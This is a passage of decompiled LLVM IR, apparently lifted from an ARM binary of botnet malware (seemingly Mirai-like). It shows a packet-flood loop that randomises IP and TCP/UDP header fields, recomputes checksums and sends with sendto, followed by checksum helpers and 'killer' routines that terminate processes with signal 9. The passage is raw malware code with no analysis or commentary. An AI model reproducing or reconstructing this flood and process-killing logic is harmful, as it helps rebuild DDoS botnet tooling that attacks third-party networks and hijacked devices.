  store i32 %v1_c6d4, i32* @sb, align 4
  %v1_c6d8 = add i32 %v0_c6d4, 47
  store i32 %v1_c6d8, i32* @sl, align 4
  br label %dec_label_pc_c6dc

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c720, %dec_label_pc_c6d0
  %v1_c6e8 = phi i32 [ %v1_c7a8, %dec_label_pc_c720 ], [ 0, %dec_label_pc_c6d0 ]
  store i32 %v2_c1ec, i32* %r3.global-to-local, align 4
  store i32 %v3_c494, i32* %ip.global-to-local, align 4
  %v4_c6e8 = mul i32 %v1_c6e8, 4
  %v5_c6e8 = add i32 %v4_c6e8, %v2_c1ec
  %v6_c6e8 = inttoptr i32 %v5_c6e8 to i32*
  %v7_c6e8 = load i32, i32* %v6_c6e8, align 4
  store i32 %v7_c6e8, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_c6f0, i1* %cpsr_z.global-to-local, align 1
  %v1_c6f4 = add i32 %v7_c6e8, 20
  store i32 %v1_c6f4, i32* @r6, align 4
  br i1 %v3_c6f0, label %dec_label_pc_c7cc, label %dec_label_pc_c6fc

dec_label_pc_c6fc:                                ; preds = %dec_label_pc_c6dc
  store i32 %v3_c49c, i32* @lr, align 4
  store i1 %v3_c700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c700, label %dec_label_pc_c7e0, label %dec_label_pc_c708

dec_label_pc_c708:                                ; preds = %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge, %dec_label_pc_c6fc
  %v1_c70c = phi i32 [ %v1_c70c.pre, %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge ], [ 65535, %dec_label_pc_c6fc ]
  store i32 %v3_c4b8, i32* %r0.global-to-local, align 4
  %v9_c70c = icmp eq i32 %v3_c4b8, %v1_c70c
  store i1 %v9_c70c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c70c, label %dec_label_pc_c7f4, label %dec_label_pc_c714

dec_label_pc_c714:                                ; preds = %dec_label_pc_c7e0, %dec_label_pc_c708
  %v1_c718 = phi i32 [ %v1_c7ec, %dec_label_pc_c7e0 ], [ %v1_c70c, %dec_label_pc_c708 ]
  store i32 %v3_c4c0, i32* %r2.global-to-local, align 4
  %v9_c718 = icmp eq i32 %v3_c4c0, %v1_c718
  store i1 %v9_c718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c718, label %dec_label_pc_c808, label %dec_label_pc_c720

dec_label_pc_c720:                                ; preds = %dec_label_pc_c7f4, %dec_label_pc_c714, %dec_label_pc_c808
  %v0_c720 = load i32, i32* @r4, align 4
  %v1_c720 = add i32 %v0_c720, 41
  store i32 %v1_c720, i32* %r0.global-to-local, align 4
  store i32 %v4_c724.pre-phi, i32* %r1.global-to-local, align 4
  %v2_c728 = call i32 @rand_alpha_str(i32 %v1_c720, i32 %v4_c724.pre-phi)
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c730 = load i32, i32* @r4, align 4
  %v3_c730 = add i32 %v2_c730, 10
  %v4_c730 = inttoptr i32 %v3_c730 to i16*
  store i16 0, i16* %v4_c730, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c738 = load i32, i32* @r4, align 4
  store i32 %v0_c738, i32* @r0, align 4
  %v2_c73c = call i32 @checksum_generic(i32 %v0_c738, i32 20)
  %v3_c73c = trunc i32 %v2_c73c to i16
  store i32 %v2_c73c, i32* %r0.global-to-local, align 4
  %v3_c740 = load i32, i32* @r4, align 4
  %v4_c740 = add i32 %v3_c740, 10
  %v5_c740 = inttoptr i32 %v4_c740 to i16*
  store i16 %v3_c73c, i16* %v5_c740, align 2
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_c748 = load i32, i32* @r6, align 4
  %v3_c748 = add i32 %v2_c748, 6
  %v4_c748 = inttoptr i32 %v3_c748 to i16*
  store i16 0, i16* %v4_c748, align 2
  %v0_c74c = load i32, i32* @r6, align 4
  store i32 %v0_c74c, i32* @r1, align 4
  %v1_c750 = add i32 %v0_c74c, 4
  %v2_c750 = inttoptr i32 %v1_c750 to i16*
  %v3_c750 = load i16, i16* %v2_c750, align 2
  %v4_c750 = zext i16 %v3_c750 to i32
  store i32 %v4_c750, i32* %r2.global-to-local, align 4
  %v0_c754 = load i32, i32* @sb, align 4
  store i32 %v0_c754, i32* %r3.global-to-local, align 4
  %v0_c758 = load i32, i32* @r4, align 4
  store i32 %v0_c758, i32* %r0.global-to-local, align 4
  %v4_c75c = call i32 @checksum_tcpudp(i32 %v0_c758, i32 %v0_c74c, i32 %v4_c750, i32 %v0_c754)
  %v5_c75c = trunc i32 %v4_c75c to i16
  store i32 %v4_c75c, i32* %r0.global-to-local, align 4
  %v3_c760 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c760, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v3_c768 = mul i32 %v3_c760, 32
  store i32 %v3_c768, i32* %ip.global-to-local, align 4
  %v3_c76c = load i32, i32* @r6, align 4
  %v4_c76c = add i32 %v3_c76c, 6
  %v5_c76c = inttoptr i32 %v4_c76c to i16*
  store i16 %v5_c75c, i16* %v5_c76c, align 2
  %v0_c770 = load i32, i32* %ip.global-to-local, align 4
  %v1_c770 = load i32, i32* %r3.global-to-local, align 4
  %tmp133 = mul i32 %v1_c770, -8
  %v5_c770 = add i32 %v0_c770, %tmp133
  store i32 %v5_c770, i32* %ip.global-to-local, align 4
  %v0_c774 = load i32, i32* @r6, align 4
  %v1_c774 = add i32 %v0_c774, 2
  %v2_c774 = inttoptr i32 %v1_c774 to i16*
  %v3_c774 = load i16, i16* %v2_c774, align 2
  %v4_c774 = zext i16 %v3_c774 to i32
  store i32 %v4_c774, i32* @r6, align 4
  %v1_c778 = load i32, i32* @lr, align 4
  %v2_c778 = add i32 %v1_c778, %v5_c770
  store i32 %v2_c778, i32* %ip.global-to-local, align 4
  %v3_c77c = add i32 %v2_c778, 2
  %v4_c77c = inttoptr i32 %v3_c77c to i16*
  store i16 %v3_c774, i16* %v4_c77c, align 2
  %v0_c780 = load i32, i32* @fp, align 4
  %v1_c780 = load i32, i32* %ip.global-to-local, align 4
  %v2_c780 = add i32 %v1_c780, 4
  %v3_c780 = inttoptr i32 %v2_c780 to i32*
  store i32 %v0_c780, i32* %v3_c780, align 4
  %v0_c784 = load i32, i32* @r4, align 4
  store i32 %v0_c784, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v0_c790 = load i32, i32* @sl, align 4
  store i32 %v0_c790, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_c798 = load i32, i32* %ip.global-to-local, align 4
  %v6_c7a0 = call i32 @__libc_sendto(i32 %v3_c438, i32 %v0_c784, i32 %v0_c790, i32 16384, i32 %v0_c798, i32 16)
  %v3_c7a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c7a4, i32* %r3.global-to-local, align 4
  %v1_c7a8 = add i32 %v3_c7a4, 1
  store i32 %v1_c7a8, i32* %r0.global-to-local, align 4
  %v0_c7ac = load i32, i32* @r8, align 4
  %v9_c7ac = icmp eq i32 %v0_c7ac, %v1_c7a8
  store i1 %v9_c7ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c7a8, i32* %stack_var_-44, align 4
  %v8_c7b4 = icmp sgt i32 %v0_c7ac, %v1_c7a8
  br i1 %v8_c7b4, label %dec_label_pc_c6dc, label %dec_label_pc_c7b8

dec_label_pc_c7b8:                                ; preds = %dec_label_pc_c720
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c7bc = icmp eq i32 %v0_c7ac, 0
  store i1 %v2_c7bc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c7bc, label %dec_label_pc_c6c0, label %dec_label_pc_c6d0

dec_label_pc_c7cc:                                ; preds = %dec_label_pc_c6dc
  %v0_c7cc = call i32 @rand_next()
  %v1_c7cc = trunc i32 %v0_c7cc to i16
  store i32 %v0_c7cc, i32* %r0.global-to-local, align 4
  store i32 %v3_c49c, i32* @lr, align 4
  %v1_c7d4 = load i32, i32* @r5, align 4
  %v9_c7d4 = icmp eq i32 %v3_c49c, %v1_c7d4
  store i1 %v9_c7d4, i1* %cpsr_z.global-to-local, align 1
  %v3_c7d8 = load i32, i32* @r4, align 4
  %v4_c7d8 = add i32 %v3_c7d8, 4
  %v5_c7d8 = inttoptr i32 %v4_c7d8 to i16*
  store i16 %v1_c7cc, i16* %v5_c7d8, align 2
  br i1 %v9_c7d4, label %dec_label_pc_c7e0, label %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge

dec_label_pc_c7cc.dec_label_pc_c708_crit_edge:    ; preds = %dec_label_pc_c7cc
  %v1_c70c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c708

dec_label_pc_c7e0:                                ; preds = %dec_label_pc_c7cc, %dec_label_pc_c6fc
  %v0_c7e0 = call i32 @rand_next()
  %v1_c7e0 = trunc i32 %v0_c7e0 to i16
  %v3_c7e4 = load i32, i32* @r4, align 4
  %v4_c7e4 = add i32 %v3_c7e4, 20
  %v5_c7e4 = inttoptr i32 %v4_c7e4 to i16*
  store i16 %v1_c7e0, i16* %v5_c7e4, align 2
  store i32 %v3_c4b8, i32* %r0.global-to-local, align 4
  %v1_c7ec = load i32, i32* @r5, align 4
  %v9_c7ec = icmp eq i32 %v3_c4b8, %v1_c7ec
  store i1 %v9_c7ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7ec, label %dec_label_pc_c7f4, label %dec_label_pc_c714

dec_label_pc_c7f4:                                ; preds = %dec_label_pc_c7e0, %dec_label_pc_c708
  %v0_c7f4 = call i32 @rand_next()
  %v1_c7f4 = trunc i32 %v0_c7f4 to i16
  store i32 %v0_c7f4, i32* %r0.global-to-local, align 4
  store i32 %v3_c4c0, i32* %r2.global-to-local, align 4
  %v1_c7fc = load i32, i32* @r5, align 4
  %v9_c7fc = icmp eq i32 %v3_c4c0, %v1_c7fc
  store i1 %v9_c7fc, i1* %cpsr_z.global-to-local, align 1
  %v3_c800 = load i32, i32* @r6, align 4
  %v4_c800 = add i32 %v3_c800, 2
  %v5_c800 = inttoptr i32 %v4_c800 to i16*
  store i16 %v1_c7f4, i16* %v5_c800, align 2
  br i1 %v9_c7fc, label %dec_label_pc_c808, label %dec_label_pc_c720

dec_label_pc_c808:                                ; preds = %dec_label_pc_c7f4, %dec_label_pc_c714
  %v0_c808 = call i32 @rand_next()
  %v1_c808 = trunc i32 %v0_c808 to i16
  store i32 %v0_c808, i32* %r0.global-to-local, align 4
  %v3_c80c = load i32, i32* @r4, align 4
  %v4_c80c = add i32 %v3_c80c, 28
  %v5_c80c = inttoptr i32 %v4_c80c to i16*
  store i16 %v1_c808, i16* %v5_c80c, align 2
  br label %dec_label_pc_c720

dec_label_pc_c814:                                ; preds = %dec_label_pc_c39c, %dec_label_pc_c37c, %dec_label_pc_c320, %entry
  %v0_c814 = call i32 @rand_next()
  %v1_c818 = urem i32 %v0_c814, 4
  store i32 %v1_c818, i32* %r0.global-to-local, align 4
  %v2_c81c = icmp eq i32 %v1_c818, 3
  store i1 %v2_c81c, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_c814 to i2
  switch i2 %trunc, label %dec_label_pc_c4189 [
    i2 0, label %dec_label_pc_c874
    i2 1, label %dec_label_pc_c86c
    i2 -2, label %dec_label_pc_c860
    i2 -1, label %dec_label_pc_c850
  ]

dec_label_pc_c838:                                ; preds = %dec_label_pc_c448
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v1_c83c = call i32 @__GI___libc_close(i32 %v3_c438)
  store i32 %v1_c83c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c840

dec_label_pc_c840:                                ; preds = %dec_label_pc_c420, %dec_label_pc_c418, %dec_label_pc_c838
  %v1_c84c = phi i32 [ %v3_c438, %dec_label_pc_c420 ], [ %v1_c84c50, %dec_label_pc_c418 ], [ %v1_c83c, %dec_label_pc_c838 ]
  store i32 %v18_c1cc, i32* %sb.global-to-local, align 4
  store i32 %v27_c1cc, i32* %lr.global-to-local, align 4
  ret i32 %v1_c84c

dec_label_pc_c850:                                ; preds = %dec_label_pc_c814
  store i32 33686020, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c860:                                ; preds = %dec_label_pc_c814
  store i32 104859200, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c86c:                                ; preds = %dec_label_pc_c814
  store i32 707416650, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c874:                                ; preds = %dec_label_pc_c814
  store i32 134744072, i32* @fp, align 4
  br label %dec_label_pc_c418

; uselistorder directives
  uselistorder i32 %v1_c818, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_c814, { 1, 0 }
  uselistorder i32 %v0_c808, { 1, 0 }
  uselistorder i32 %v0_c7f4, { 1, 0 }
  uselistorder i32 %v1_c7ec, { 1, 0 }
  uselistorder i32 %v0_c7cc, { 1, 0 }
  uselistorder i32 %v1_c7a8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c770, { 1, 0 }
  uselistorder i32 %v4_c75c, { 1, 0 }
  uselistorder i32 %v2_c73c, { 1, 0 }
  uselistorder i1 %v3_c700, { 1, 0 }
  uselistorder i1 %v3_c6f0, { 1, 0 }
  uselistorder i32 %v4_c724.pre-phi, { 1, 0 }
  uselistorder i32 %v1_c698, { 1, 0, 2 }
  uselistorder i32 %v0_c688, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_c674, { 2, 0, 3, 1 }
  uselistorder i32 %v0_c670, { 1, 0, 2 }
  uselistorder i32 %v0_c5e0, { 1, 0 }
  uselistorder i32 %v4_c5dc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %tmp112, { 1, 0 }
  uselistorder i32 %v3_c528, { 1, 0 }
  uselistorder i32 %v3_c4e4, { 1, 0 }
  uselistorder i32 %v1_c4d8, { 2, 0, 1 }
  uselistorder i32 %v3_c4a4, { 1, 0 }
  uselistorder i32 %v3_c49c, { 1, 2, 3, 5, 0, 4 }
  uselistorder i32 %v3_c494, { 0, 2, 1 }
  uselistorder i8 %v5_c48c, { 1, 0, 2 }
  uselistorder i32 %v1_c478, { 1, 0 }
  uselistorder i32 %v0_c478, { 1, 0 }
  uselistorder i1 %v7_c468, { 1, 0 }
  uselistorder i1 %v7_c43c, { 1, 0 }
  uselistorder i32 %v3_c438, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v0_c418, { 1, 0, 2 }
  uselistorder i32 %v2_c3e8, { 0, 1, 3, 2 }
  uselistorder i32 %v2_c3e4, { 1, 0, 2 }
  uselistorder i1 %v7_c3d0, { 1, 0 }
  uselistorder i32 %v1_c3cc, { 1, 0, 2 }
  uselistorder i1 %v8_c3c4, { 1, 0 }
  uselistorder i1 %v7_c3c0, { 1, 0 }
  uselistorder i32 %v1_c3b4, { 1, 0 }
  uselistorder i8 %v2_c3a8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_c3ac, { 1, 0 }
  uselistorder i32 %v0_c3cc, { 3, 0, 2, 1 }
  uselistorder i32 %v0_c39c, { 0, 2, 1 }
  uselistorder i32 %v1_c3b0, { 0, 2, 1 }
  uselistorder i32 %v2_c384, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c37c, { 1, 0, 2, 3 }
  uselistorder i1 %v7_c374, { 1, 0 }
  uselistorder i32 %v0_c374, { 2, 3, 4, 1, 6, 5, 0 }
  uselistorder i32 %v0_c318, { 1, 0, 3, 2 }
  uselistorder i32 %v6_c2b8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_c29c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_c284, { 2, 1, 0, 3 }
  uselistorder i32 %v1_c26c, { 1, 2, 0 }
  uselistorder i32 %v5_c260, { 0, 2, 1 }
  uselistorder i32 %v7_c228, { 1, 0, 2, 3 }
  uselistorder i32 %v5_c228, { 0, 2, 1 }
  uselistorder i32 %v2_c1ec, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 1, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 36, 35, 37, 39, 38, 41, 40, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 6, 5, 8, 7, 9, 11, 10, 12, 13, 14, 16, 15, 19, 17, 18, 20, 21, 26, 22, 23, 24, 25, 30, 27, 28, 29, 31, 33, 32, 34, 35, 36, 37, 39, 38, 40, 41, 43, 42, 44, 46, 45, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 26, 27, 28, 25, 22, 29, 30, 31 }
  uselistorder i16 64, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 41, { 2, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @inet_addr, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32, i32)* @attack_get_opt_int, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 93, 94, 95, 96, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c840, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c720, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c6d0, { 1, 0 }
  uselistorder label %dec_label_pc_c6c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c6c0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_c690, { 1, 0 }
  uselistorder label %.thread18, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %dec_label_pc_c3e0, { 1, 0 }
  uselistorder label %dec_label_pc_c3d0, { 1, 0 }
  uselistorder label %dec_label_pc_c39c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c394, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_c8b0, label %dec_label_pc_c898

dec_label_pc_c898:                                ; preds = %entry
  %v0_c8a0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c89c

dec_label_pc_c89c:                                ; preds = %dec_label_pc_c89c, %dec_label_pc_c898
  %v0_c8a8 = phi i32 [ %v2_c8a8, %dec_label_pc_c89c ], [ 0, %dec_label_pc_c898 ]
  %v0_c8a0 = phi i32 [ %v5_c8a0, %dec_label_pc_c89c ], [ %v0_c8a0.pre, %dec_label_pc_c898 ]
  %v0_c89c = phi i32 [ %v1_c89c, %dec_label_pc_c89c ], [ %arg1, %dec_label_pc_c898 ]
  %v1_c89c = add i32 %v0_c89c, -2
  %v1_c8a0 = inttoptr i32 %v0_c8a0 to i16*
  %v2_c8a0 = load i16, i16* %v1_c8a0, align 2
  %v3_c8a0 = zext i16 %v2_c8a0 to i32
  %v5_c8a0 = add i32 %v0_c8a0, -2
  store i32 %v5_c8a0, i32* @r0, align 4
  %v2_c8a8 = add i32 %v3_c8a0, %v0_c8a8
  %v1_c89c.cmp = icmp ugt i32 %v1_c89c, 1
  br i1 %v1_c89c.cmp, label %dec_label_pc_c89c, label %dec_label_pc_c8b0.loopexit

dec_label_pc_c8b0.loopexit:                       ; preds = %dec_label_pc_c89c
  br label %dec_label_pc_c8b0

dec_label_pc_c8b0:                                ; preds = %entry, %dec_label_pc_c8b0.loopexit
  %v1_c8b8 = phi i32 [ %v2_c8a8, %dec_label_pc_c8b0.loopexit ], [ 0, %entry ]
  %v0_c8b0 = phi i32 [ %v1_c89c, %dec_label_pc_c8b0.loopexit ], [ %arg1, %entry ]
  %v7_c8b0 = icmp eq i32 %v0_c8b0, 1
  br i1 %v7_c8b0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c8b0
  %v1_c8b4 = load i32, i32* @r0, align 4
  %v2_c8b4 = inttoptr i32 %v1_c8b4 to i8*
  %v3_c8b4 = load i8, i8* %v2_c8b4, align 1
  %v4_c8b4 = zext i8 %v3_c8b4 to i32
  %v3_c8b8 = add i32 %v1_c8b8, %v4_c8b4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c8b0, %bb
  %v0_c8bc = phi i32 [ %v1_c8b8, %dec_label_pc_c8b0 ], [ %v3_c8b8, %bb ]
  %v3_c8c0 = urem i32 %v0_c8bc, 65536
  %v4_c8c4 = udiv i32 %v0_c8bc, 65536
  %v5_c8c4 = add nuw nsw i32 %v4_c8c4, %v3_c8c0
  %v4_c8c8 = udiv i32 %v5_c8c4, 65536
  %v5_c8c8 = add nuw nsw i32 %v4_c8c8, %v5_c8c4
  %v1_c8cc = urem i32 %v5_c8c8, 65536
  %v3_c8d4 = xor i32 %v1_c8cc, 65535
  ret i32 %v3_c8d4

; uselistorder directives
  uselistorder i32 %v5_c8c4, { 1, 0 }
  uselistorder i32 %v5_c8a0, { 1, 0 }
  uselistorder i32 %v1_c89c, { 1, 0, 2 }
  uselistorder i32 %v0_c8a0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_c8b0, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_c8ec = add i32 %arg1, 12
  %v2_c8ec = inttoptr i32 %v1_c8ec to i32*
  %v3_c8ec = load i32, i32* %v2_c8ec, align 4
  %v1_c8f0 = add i32 %arg1, 16
  %v2_c8f0 = inttoptr i32 %v1_c8f0 to i32*
  %v3_c8f0 = load i32, i32* %v2_c8f0, align 4
  %v7_c8f4 = icmp sgt i32 %arg3, 1
  br i1 %v7_c8f4, label %dec_label_pc_c900.preheader, label %dec_label_pc_c914

dec_label_pc_c900.preheader:                      ; preds = %entry
  %v0_c904.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c900

dec_label_pc_c900:                                ; preds = %dec_label_pc_c900.preheader, %dec_label_pc_c900
  %v0_c90c = phi i32 [ 0, %dec_label_pc_c900.preheader ], [ %v2_c90c, %dec_label_pc_c900 ]
  %v0_c904 = phi i32 [ %v0_c904.pre, %dec_label_pc_c900.preheader ], [ %v5_c904, %dec_label_pc_c900 ]
  %v0_c900 = phi i32 [ %arg3, %dec_label_pc_c900.preheader ], [ %v1_c900, %dec_label_pc_c900 ]
  %v1_c900 = add nsw i32 %v0_c900, -2
  %v1_c904 = inttoptr i32 %v0_c904 to i16*
  %v2_c904 = load i16, i16* %v1_c904, align 2
  %v3_c904 = zext i16 %v2_c904 to i32
  %v5_c904 = add i32 %v0_c904, -2
  store i32 %v5_c904, i32* @r1, align 4
  %v2_c90c = add i32 %v3_c904, %v0_c90c
  %v8_c910 = icmp sgt i32 %v1_c900, 1
  br i1 %v8_c910, label %dec_label_pc_c900, label %dec_label_pc_c914.loopexit

dec_label_pc_c914.loopexit:                       ; preds = %dec_label_pc_c900
  br label %dec_label_pc_c914

dec_label_pc_c914:                                ; preds = %dec_label_pc_c914.loopexit, %entry
  %v1_c920 = phi i32 [ %v2_c90c, %dec_label_pc_c914.loopexit ], [ 0, %entry ]
  %v0_c914 = phi i32 [ %v1_c900, %dec_label_pc_c914.loopexit ], [ %arg3, %entry ]
  %v7_c914 = icmp eq i32 %v0_c914, 1
  br i1 %v7_c914, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c914
  br label %bb19

bb:                                               ; preds = %dec_label_pc_c914
  %v1_c918 = load i32, i32* @r1, align 4
  %v2_c918 = inttoptr i32 %v1_c918 to i8*
  %v3_c918 = load i8, i8* %v2_c918, align 1
  %v4_c918 = zext i8 %v3_c918 to i32
  %v3_c920 = add i32 %v4_c918, %v1_c920
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_c948 = phi i32 [ %v1_c920, %.thread ], [ %v3_c920, %bb ]
  %v0_c928 = mul i32 %v3_c8ec, 65536
  %v3_c928 = udiv i32 %v0_c928, 65536
  %v3_c92c = urem i32 %v3_c8f0, 65536
  %v4_c934 = udiv i32 %v3_c8ec, 65536
  %v2_c930 = add nuw nsw i32 %v3_c92c, %v4_c934
  %v5_c934 = add nuw nsw i32 %v2_c930, %v3_c928
  %v1_c938 = add i32 %arg1, 9
  %v2_c938 = inttoptr i32 %v1_c938 to i8*
  %v3_c938 = load i8, i8* %v2_c938, align 1
  %v4_c938 = zext i8 %v3_c938 to i32
  %v4_c93c = udiv i32 %v3_c8f0, 65536
  %v3_c944 = mul nuw nsw i32 %v4_c938, 256
  %v5_c93c = add i32 %v4_c93c, %arg2
  %v2_c940 = add i32 %v5_c93c, %v1_c948
  %v2_c948 = add i32 %v2_c940, %v5_c934
  %v2_c94c = add i32 %v2_c948, %v3_c944
  %tmp = icmp ult i32 %v2_c94c, 65536
  br i1 %tmp, label %dec_label_pc_c96c, label %dec_label_pc_c958

dec_label_pc_c958:                                ; preds = %bb19, %dec_label_pc_c958
  %v2_c9605 = phi i32 [ %v2_c960, %dec_label_pc_c958 ], [ %v2_c94c, %bb19 ]
  %v3_c9646.in = phi i32 [ %v2_c960, %dec_label_pc_c958 ], [ %v2_c94c, %bb19 ]
  %v3_c9646 = udiv i32 %v3_c9646.in, 65536
  %v3_c95c = urem i32 %v2_c9605, 65536
  %v2_c960 = add nuw nsw i32 %v3_c95c, %v3_c9646
  %tmp20 = icmp ult i32 %v2_c960, 65536
  br i1 %tmp20, label %dec_label_pc_c96c.loopexit, label %dec_label_pc_c958

dec_label_pc_c96c.loopexit:                       ; preds = %dec_label_pc_c958
  br label %dec_label_pc_c96c

dec_label_pc_c96c:                                ; preds = %dec_label_pc_c96c.loopexit, %bb19
  %v0_c96c = phi i32 [ %v2_c960, %dec_label_pc_c96c.loopexit ], [ %v2_c94c, %bb19 ]
  %v1_c96c = urem i32 %v0_c96c, 65536
  %v3_c974 = xor i32 %v1_c96c, 65535
  ret i32 %v3_c974

; uselistorder directives
  uselistorder i32 %v2_c960, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c94c, { 3, 0, 2, 1 }
  uselistorder i32 %v1_c920, { 1, 0 }
  uselistorder i32 %v5_c904, { 1, 0 }
  uselistorder i32 %v0_c904, { 1, 0 }
  uselistorder i32 %v3_c8ec, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c958, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_c900, { 1, 0 }
}

define i32 @killer_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_c98c = load i32, i32* @global_var_24a54.71, align 4
  %v2_c994 = call i32 @kill(i32 %v2_c98c, i32 9)
  ret i32 %v2_c994
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_c9a8 = load i32, i32* @r4, align 4
  %v6_c9a8 = load i32, i32* @r5, align 4
  %v9_c9a8 = load i32, i32* @r6, align 4
  %v12_c9a8 = load i32, i32* @r7, align 4
  %v15_c9a8 = load i32, i32* @r8, align 4
  %v18_c9a8 = load i32, i32* @sb, align 4
  %v21_c9a8 = load i32, i32* @sl, align 4
  %v24_c9a8 = load i32, i32* @fp, align 4
  %v27_c9a8 = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_c9c4 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_c9c4, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
